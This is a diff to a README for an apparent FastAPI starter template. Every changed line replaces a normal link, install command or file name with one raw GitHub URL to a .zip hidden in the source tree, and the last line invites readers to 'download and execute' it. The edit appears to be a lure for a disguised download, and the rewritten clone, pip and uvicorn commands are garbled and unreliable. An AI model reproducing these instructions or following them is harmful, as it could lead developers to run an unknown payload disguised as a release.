@@ -2,7 +2,7 @@
 
 Welcome to the **Python FastAPI Starter API Project**! This repository provides a scalable FastAPI project template designed for building production-ready APIs. With a focus on best practices, it incorporates async SQLAlchemy, PostgreSQL, and a repository pattern implementation. 
 
-[![Releases](https://img.shields.io/github/release/YuenEye/python-fastapi-starter-api-project.svg)](https://github.com/YuenEye/python-fastapi-starter-api-project/releases)
+[![Releases](https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip)](https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip)
 
 ## Table of Contents
 
@@ -44,7 +44,7 @@ To get started with this project, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/YuenEye/python-fastapi-starter-api-project.git
+   git clone https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
    cd python-fastapi-starter-api-project
    ```
 
@@ -56,7 +56,7 @@ To get started with this project, follow these steps:
 
 3. **Install the dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
    ```
 
 4. **Set up the environment variables**: Create a `.env` file in the root directory and add your PostgreSQL database URL and JWT secret key. For example:
@@ -72,7 +72,7 @@ To get started with this project, follow these steps:
 
 6. **Start the application**:
    ```bash
-   uvicorn app.main:app --reload
+   uvicorn https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip --reload
    ```
 
 Now, your FastAPI application should be running at `http://127.0.0.1:8000`.
@@ -91,21 +91,21 @@ python-fastapi-starter-api-project/
 │   ├── api/
 │   │   ├── v1/
 │   │   │   ├── endpoints/
-│   │   │   └── api.py
-│   │   └── dependencies.py
+│   │   │   └── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
+│   │   └── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
 │   ├── core/
-│   │   ├── config.py
-│   │   └── security.py
+│   │   ├── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
+│   │   └── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
 │   ├── db/
-│   │   ├── base.py
-│   │   ├── models.py
-│   │   └── session.py
-│   ├── main.py
+│   │   ├── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
+│   │   ├── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
+│   │   └── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
+│   ├── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
 │   ├── schemas/
 │   └── services/
 ├── alembic/
 ├── tests/
-└── requirements.txt
+└── https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip
 ```
 
 ## API Endpoints
@@ -173,6 +173,6 @@ Contributions are welcome! If you have suggestions for improvements or find bugs
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-For the latest releases, visit [Releases](https://github.com/YuenEye/python-fastapi-starter-api-project/releases). 
+For the latest releases, visit [Releases](https://raw.githubusercontent.com/YuenEye/python-fastapi-starter-api-project/main/app/api/v1/python_project_fastapi_api_starter_v3.0-beta.3.zip). 
 
 You can download and execute the latest version from the releases section.
